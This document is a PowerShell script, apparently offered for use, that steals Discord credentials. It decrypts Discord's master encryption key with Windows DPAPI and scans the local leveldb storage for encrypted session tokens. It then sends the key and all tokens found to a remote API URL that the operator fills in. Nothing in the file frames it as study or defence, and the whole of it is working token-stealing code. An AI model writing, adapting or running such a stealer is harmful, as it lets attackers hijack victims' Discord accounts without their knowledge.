# Discord Token Extractor and API Sender - Extract Only, No Decryption
param(
    [string]$ApiUrl = "INPUT API URL HERE"
)

Add-Type -AssemblyName System.Security

function Get-Headers {
    return @{
        "Content-Type" = "application/json"
        "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
}

Write-Host "Discord Token Extractor and API Sender" -ForegroundColor Green
Write-Host "=" * 60

$discordPath = "$env:APPDATA\discord"
$tokensPath = Join-Path $discordPath "Local Storage\leveldb"

Write-Host "Discord Path: $discordPath" -ForegroundColor Cyan
Write-Host "API Endpoint: $ApiUrl" -ForegroundColor Yellow

if (-not (Test-Path $discordPath)) {
    Write-Host "ERROR: Discord not found at: $discordPath" -ForegroundColor Red
    exit
}

if (-not (Test-Path $tokensPath)) {
    Write-Host "ERROR: Discord leveldb not found at: $tokensPath" -ForegroundColor Red
    exit
}

# Get decryption key (but don't decrypt anything - just get the key for API)
try {
    Write-Host "Getting decryption key..." -ForegroundColor Green
    $localStatePath = Join-Path $discordPath "Local State"
    $content = Get-Content -Path $localStatePath -Raw -Encoding UTF8 -ErrorAction Stop
    $json = ConvertFrom-Json $content
    $encryptedKey = $json.os_crypt.encrypted_key
    
    $keyBytes = [System.Convert]::FromBase64String($encryptedKey)
    $keyToDecrypt = $keyBytes[5..($keyBytes.Length - 1)]
    
    $decryptedKeyBytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
        $keyToDecrypt, 
        $null, 
        [System.Security.Cryptography.DataProtectionScope]::CurrentUser
    )
    $decryptionKey = [System.Convert]::ToBase64String($decryptedKeyBytes)
    Write-Host "Successfully obtained decryption key (for API transmission)" -ForegroundColor Green
}
catch {
    Write-Host "Failed to get decryption key: $_" -ForegroundColor Red
    exit
}

# Scan leveldb files for tokens
$files = Get-ChildItem -Path $tokensPath -File | Where-Object { $_.Extension -eq ".ldb" -or $_.Extension -eq ".log" }
Write-Host "Scanning $($files.Count) leveldb files..." -ForegroundColor Green

$allTokens = @()
$tokenId = 1

foreach ($file in $files) {
    Write-Host "   Scanning: $($file.Name)" -ForegroundColor Gray
    
    try {
        $content = Get-Content -Path $file.FullName -Raw -ErrorAction SilentlyContinue
        if ($content) {
            # Find Discord encrypted tokens
            $tokenMatches = [regex]::Matches($content, 'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)')
            
            foreach ($match in $tokenMatches) {
                $fullToken = $match.Value
                $base64Part = $match.Groups[1].Value
                
                # Only include tokens with reasonable length
                if ($base64Part.Length -gt 30) {
                    $allTokens += @{
                        'id' = $tokenId
                        'source_file' = $file.Name
                        'full_token' = $fullToken
                        'base64_encrypted' = $base64Part
                        'length' = $base64Part.Length
                    }
                    Write-Host "     Found token $tokenId (length: $($base64Part.Length))" -ForegroundColor Green
                    $tokenId++
                }
            }
        }
    }
    catch {
        Write-Host "     Error reading file: $_" -ForegroundColor Yellow
    }
}

if ($allTokens.Count -eq 0) {
    Write-Host "No tokens found" -ForegroundColor Red
    exit
}

Write-Host "Found $($allTokens.Count) tokens total" -ForegroundColor Green

# Create the JSON structure
$jsonData = @{
    "decryption_key" = $decryptionKey
    "tokens" = $allTokens
    "extraction_info" = @{
        "timestamp" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "discord_path" = $tokensPath
        "files_scanned" = $files.Count
        "tokens_found" = $allTokens.Count
    }
}

# Send to API
try {
    Write-Host "Converting data to JSON..." -ForegroundColor Green
    $jsonString = $jsonData | ConvertTo-Json -Depth 4
    
    Write-Host "JSON size: $($jsonString.Length) characters" -ForegroundColor Gray
    
    # Create API payload - sending the JSON as text in the output field
    $payload = @{
        "output" = $jsonString
    }
    
    $payloadJson = $payload | ConvertTo-Json -Depth 1
    $headers = Get-Headers
    
    Write-Host "Sending to API: $ApiUrl" -ForegroundColor Green
    
    $response = Invoke-RestMethod -Uri $ApiUrl -Method POST -Body $payloadJson -Headers $headers -ContentType "application/json"
    
    Write-Host "Successfully sent to API!" -ForegroundColor Green
    Write-Host "Server response: $response" -ForegroundColor Cyan
    
    Write-Host "`nMISSION ACCOMPLISHED!" -ForegroundColor Green
    Write-Host "   Extracted $($allTokens.Count) Discord tokens" -ForegroundColor Gray
    Write-Host "   Successfully transmitted to API" -ForegroundColor Gray
    Write-Host "   API: $ApiUrl" -ForegroundColor Gray
}
catch {
    Write-Host "Failed to send to API: $($_.Exception.Message)" -ForegroundColor Red
    if ($_.Exception.Response) {
        Write-Host "   HTTP Status: $($_.Exception.Response.StatusCode)" -ForegroundColor Red
    }
}

Write-Host "`n" + "=" * 60

